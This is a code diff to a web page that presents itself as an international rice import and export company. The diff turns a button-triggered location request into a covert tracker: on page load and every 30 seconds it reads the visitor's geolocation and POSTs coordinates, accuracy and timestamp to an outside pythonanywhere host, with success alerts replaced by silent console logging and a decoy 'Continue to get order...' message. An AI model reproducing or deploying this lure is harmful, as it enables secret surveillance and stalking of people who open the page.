@@ -3,42 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rice import & export</title>
+    <title>International Rice Import & Export Company</title>
 </head>
 <body>
-    <h2>Click the button to receive order</h2>
-    <button onclick="sendLocation()">Receive Order</button>
-
-    <title>Rice Import & Export</title>
-</head>
-<body>
-    <h2>Click the button to receive order</h2>
-    <button onclick="sendLocation()">Receive Order</button>
+    <h2 id="message">Continue to get order...</h2> <!-- ✅ Message instead of button -->
 
     <script>
         function sendLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    fetch("https://tcms.pythonanywhere.com/send-location", {  // ✅ Ensure this points to PythonAnywhere
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            timestamp: new Date().toISOString()
-                        })
-                    })
-                    .then(response => response.json())
-                    .then(data => alert("Location sent successfully!"))
-                    .catch(error => alert("Error sending location!"));
-                }, error => {
-                    alert("Error getting location: " + error.message);
-                });
+                navigator.geolocation.getCurrentPosition(
+                    position => sendData(position),
+                    error => console.error("Error getting location: " + error.message)
+                );
             } else {
-                alert("Geolocation is not supported by this browser.");
+                console.error("Geolocation is not supported by this browser.");
             }
         }
+
+        function sendData(position) {
+            fetch("https://tcms.pythonanywhere.com/send-location", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    timestamp: new Date().toISOString()
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log("Location sent successfully"))
+            .catch(error => console.error("Error sending location: " + error.message));
+        }
+
+        // ✅ Automatically send location once site is opened
+        window.onload = sendLocation;
+
+        // ✅ Continue sending location every 30 seconds
+        setInterval(sendLocation, 30000);
     </script>
 </body>
 </html>
